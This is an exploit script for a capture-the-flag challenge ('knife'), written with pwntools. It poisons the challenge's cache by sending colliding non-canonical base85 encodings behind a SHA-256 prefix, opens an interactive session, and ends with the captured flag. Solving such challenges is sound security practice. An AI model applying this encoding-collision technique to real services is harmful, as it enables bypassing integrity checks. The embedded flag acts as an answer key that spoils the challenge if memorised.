#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from hashlib import sha256

context.update(arch="amd64")
context.log_level = logging.DEBUG
context.terminal = [
    "zellij",
    "action",
    "new-pane",
    "-d",
    "right",
    "-c",
    "--",
    "bash",
    "-c",
]
exe = "./chal"

host = args.HOST or "knife.2024.ctfcompetition.com"
port = int(args.PORT or 1337)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


gdbscript = """
# starti
# brva 0x1af9
# b SHA256
# b get
# b put
# b encodehex
# b no_op
# b memcmp
# b decodehex
# b encodehex
# b decode85
# b encode85
# b no_op
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~"

def a85(n: int) -> str:
    ret = ""
    for i in range(5):
        ret += alphabet[n % len(alphabet)]
        n = n // len(alphabet)

    return ret


def send_cmd(dec: str, enc: str, s: str):
    io.recvuntil("command...")
    cmd = f"{dec} {enc} {s}"
    io.sendline(cmd)


# we want a85 collisions on a valid sha256 starting with "a85"
hash = sha256(b"2015").hexdigest()[3:] + '0'*4
a = a85(0x41414141)
b = a85(0x0101010041)

io = start()

# fill until we go back to the first cache
for i in range(8):
    send_cmd("plain", "plain", f"{i}")

send_cmd("a85", "hex", hash + a*4 + b)
send_cmd("a85", "hex", hash + a*3 + b + a)
send_cmd("a85", "hex", hash + a*2 + b + a*2)
send_cmd("a85", "hex", hash + a*1 + b + a*3)
send_cmd("a85", "hex", hash + b + a*4)

send_cmd("plain", "plain", "2015")

io.interactive()

# CTF{nonc4nonical_3ncod1ngs_g00d_for_stego_g00d_for_pwn}
